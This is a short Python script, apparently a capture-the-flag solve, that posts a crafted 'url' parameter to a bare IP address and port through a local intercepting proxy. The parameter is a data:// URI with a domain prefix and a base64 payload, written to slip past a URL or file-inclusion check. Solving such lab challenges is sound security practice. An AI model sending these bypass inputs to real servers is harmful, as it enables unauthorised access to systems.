import requests

data = {
    'url':'data://baidu.com/plain;base64,bjNrMA=='
}
proxies = {
    'http': 'http://127.0.0.1:8080'
}
req = requests.post('http://61.147.171.105:52887', data = data, proxies = proxies)
print(req.text)

